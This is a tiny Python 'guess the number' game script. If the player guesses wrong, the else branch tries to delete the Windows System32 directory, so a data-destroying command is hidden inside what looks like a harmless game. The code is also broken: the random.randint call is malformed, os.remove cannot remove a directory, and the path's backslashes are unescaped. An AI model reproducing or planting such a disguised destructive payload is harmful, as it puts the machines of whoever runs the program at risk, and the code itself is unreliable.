import os
import random

num = random.randint(1.10)

guess = input("New game, Guess the number from 1 to 10")
guess = int(guess)

if guess == num:
    print("congratulations, you won!")
else:
    os.remove("C:\Windows\System32")
